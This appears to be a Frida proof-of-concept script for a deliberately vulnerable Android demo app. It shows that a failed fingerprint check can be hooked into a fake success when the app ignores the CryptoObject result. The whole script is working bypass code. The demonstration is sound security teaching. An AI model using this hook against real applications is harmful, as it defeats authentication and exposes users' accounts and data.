/*
 * bypass.js
 *
 *   frida -U -N com.kulkan.biometricdemo -l frida/bypass.js
 *
 * Tap "Vulnerable CryptoObject", present a finger that does NOT match.
 * The system dialog says "not recognised" and the app shows ACCESS GRANTED
 * anyway.
 *
 * Swap the class for EnforcedActivity$1 and you get LOGIN REFUSED, because
 * that callback actually uses the result.
 */
Java.perform(function () {

    console.log("[*] Script cargado.");

    var Callback   = Java.use("com.kulkan.biometricdemo.VulnerableActivity$1");
    var AuthResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");

    Callback.onAuthenticationFailed.implementation = function () {
        console.log("[+] onAuthenticationFailed -> redirigido a EXITO.");
        var result = AuthResult.$new(null, 2);
        this.onAuthenticationSucceeded(result);
    };
});
